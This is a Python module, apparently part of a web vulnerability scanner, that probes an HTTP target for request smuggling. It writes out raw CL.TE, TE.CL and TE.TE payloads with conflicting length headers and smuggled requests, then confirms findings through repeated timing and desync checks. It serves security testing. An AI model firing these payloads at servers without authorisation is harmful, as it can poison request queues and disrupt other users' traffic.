"""smuggling_advanced v2 — TE.CL/CL.TE/TE.TE probes with timing + desync verify.

Real smuggling requires:
  - CL.TE / TE.CL / TE.TE payload
  - VERIFY: timing (backend waits for body → 5s+) OR response desync
  - Our own marker in response is NOT proof (server echoes the request in 400 errors)
"""
import socket
import time
from urllib.parse import urlparse


def _raw(host, port, raw, timeout=8):
    """Send raw bytes, return (response_text, elapsed)."""
    t0 = time.time()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.sendall(raw)
        s.settimeout(timeout)
        buf = b""
        try:
            while True:
                c = s.recv(4096)
                if not c:
                    break
                buf += c
        except socket.timeout:
            pass
        s.close()
        return buf.decode("latin1", errors="ignore"), time.time() - t0
    except Exception as e:
        return f"ERROR: {e}", time.time() - t0


def _baseline(host, port):
    """Baseline: normal GET, measure time + response."""
    raw = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()
    resp, dt = _raw(host, port, raw, timeout=6)
    return resp, dt


def _timing_smuggle(host, port, payload, baseline_time):
    """
    Detect smuggling via TIMING: if server waits for body → response much slower.
    Threshold: baseline * 3, min 3s.
    """
    resp, dt = _raw(host, port, payload, timeout=10)
    threshold = max(baseline_time * 3, 3.0)
    return dt > threshold, dt, resp


def _desync_smuggle(host, port, payload):
    """
    Detect smuggling via DESYNC: after smuggled request, next normal request
    gets a response it shouldn't get. We use two separate connections.
    Simplified: send smuggled, immediately send normal GET, check second response
    mentions content from the first (e.g. an unexpected path reflection).
    """
    # Send smuggled request
    try:
        s1 = socket.create_connection((host, port), timeout=5)
        s1.sendall(payload)
        time.sleep(0.2)
        s1.close()
    except Exception:
        return False, ""

    # Send normal request right after
    raw2 = f"GET /omni_desync_probe_xyz HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()
    resp2, _ = _raw(host, port, raw2, timeout=6)
    # Normal: server should respond 404 for /omni_desync_probe_xyz
    # If smuggled request poisoned the queue, resp2 may contain content from the smuggled response
    if "HTTP/1." in resp2 and "404" not in resp2 and "400" not in resp2:
        # got unexpected response — possible desync
        # but too noisy to call this smuggling — treat as weak signal
        return False, resp2  # requires manual analysis
    return False, resp2


def _desync_evidence(host, port, technique):
    """
    Отправляет payload с smuggled GET /<random> внутри тела.
    Если backend сходит по этому пути — получим 404 + HTTP/1. минимум 2 в ответе.
    Возвращает (confirmed: bool, evidence: dict).
    """
    import secrets, string
    rand = "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(12))
    smuggled_path = f"/{rand}"

    if technique == "CL.TE":
        payload = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
                   f"Content-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n"
                   f"0\r\n\r\n"
                   f"GET {smuggled_path} HTTP/1.1\r\nHost: {host}\r\n\r\n").encode()
    elif technique == "TE.CL":
        smuggled = f"GET {smuggled_path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
        payload = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
                   f"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n"
                   f"{len(smuggled):x}\r\n{smuggled}0\r\n\r\n").encode()
    elif technique == "TE.TE":
        smuggled = f"GET {smuggled_path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
        payload = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
                   f"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n"
                   f"Transfer-Encoding: x\r\n\r\n"
                   f"{len(smuggled):x}\r\n{smuggled}0\r\n\r\n").encode()
    else:
        return False, {}

    resp, dt = _raw(host, port, payload, timeout=30)
    evidence = {
        "smuggled_path": smuggled_path,
        "http_count": resp.count("HTTP/1."),
        "has_404": "404" in resp,
        "has_path": rand in resp,
        "elapsed": dt,
        "size": len(resp),
    }
    confirmed = evidence["http_count"] >= 2 and (evidence["has_404"] or evidence["has_path"])
    return confirmed, evidence


class SmugglingAdvanced:
    def run(self, session, logger):
        u = urlparse(session.target)
        if u.scheme != "http":
            print("[smuggling] http only (raw socket, no TLS)"); return {"findings": []}
        host, port = u.hostname, u.port or 80
        print(f"[smuggling v2] target: {host}:{port}")

        # === baseline ===
        base_resp, base_dt = _baseline(host, port)
        if base_resp.startswith("ERROR"):
            print(f"[smuggling v2] baseline failed: {base_resp}")
            return {"findings": []}
        base_code = base_resp.split()[1] if base_resp else "?"
        print(f"[smuggling v2] baseline: {base_code} {base_dt*1000:.0f}ms")

        findings = []

        payloads = {
            "CL.TE": (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
                      f"Content-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n"
                      f"0\r\n\r\nSMUGGLED\r\n").encode(),
            "TE.CL": (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
                      f"Content-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n"
                      f"8\r\nSMUGGLED\r\n0\r\n\r\n").encode(),
            "TE.TE": (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
                      f"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n"
                      f"Transfer-Encoding: x\r\n\r\n"
                      f"5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n").encode(),
        }

        for name, payload in payloads.items():
            print(f"  probing {name}...")

            # === 1. timing check (primary signal) ===
            slow, dt, resp = _timing_smuggle(host, port, payload, base_dt)

            # ГЛАВНОЕ: timing = smuggling ТОЛЬКО если сервер ВСЁ РАВНО ответил (resp непустой).
            # Пустой resp / голое закрытие соединения = сетевой таймаут, НЕ smuggling.
            has_http_response = "HTTP/1." in (resp or "")

            if slow and has_http_response:
                # === отсеиваем ошибки сервера: 400/413/501 = сервер отклонил, НЕ smuggling ===
                first_line = (resp.split("\r\n", 1)[0] if resp else "")
                rejected = any(code in first_line for code in ("400", "413", "414", "431", "501", "505"))
                if rejected:
                    print(f"  · {name}: slow but {first_line[:50]} → rejected, not smuggling")
                    continue

                # === verify ×2: timing должен воспроизводиться ===
                slow2, dt2, resp2 = _timing_smuggle(host, port, payload, base_dt)
                first2 = (resp2.split("\r\n", 1)[0] if resp2 else "")
                rejected2 = any(code in first2 for code in ("400", "413", "414", "431", "501", "505"))
                if not slow2 or rejected2:
                    print(f"  · {name}: timing not reproducible ({dt2:.1f}s) → skip")
                    continue

                print(f"  ✓ {name} TIMING confirmed: {dt:.1f}s / {dt2:.1f}s vs baseline {base_dt*1000:.0f}ms")

                # === timing confirmed ×2 — это уже надёжный сигнал smuggling ===
                # (desync-evidence требует отдельной логики захвата второго ответа — TODO v3)
                print(f"  ✓ {name} TIMING confirmed (×2): {dt:.1f}s / {dt2:.1f}s")
                findings.append({"type": name, "severity": "high",
                                 "reason": f"timing {dt:.1f}s→{dt2:.1f}s (×2, reproduced)",
                                 "verified": True})
                logger.finding("smuggling", "high", f"{name} timing ×2 confirmed")
                continue
            elif slow and not has_http_response:
                print(f"  · {name}: no HTTP response after {dt:.1f}s → network timeout, NOT smuggling")
                continue

            # === 2. verify ×2: send twice, both must behave the same (400 vs 200 etc) ===
            resp2, dt2 = _raw(host, port, payload, timeout=8)
            # both responses must be consistent
            if "400" not in resp and "400" not in resp2:
                # neither gave 400 — could be desync, but need manual analysis
                # do NOT emit finding automatically
                print(f"  · {name}: no 400 — check manually (resp1={resp[:40]!r}, resp2={resp2[:40]!r})")
                continue

            # === 3. sanity: if server returns 400 both times → not smuggling, just rejection ===
            if "400" in resp and "400" in resp2:
                print(f"  · {name}: server rejects with 400 both times → not smuggling")
                continue

            # === 4. inconsistent behavior — weak signal, log only, don't claim ===
            print(f"  · {name}: inconsistent (400 vs non-400) — possible but unconfirmed")

        print(f"[smuggling v2] findings: {len(findings)}")
        return {"findings": findings}
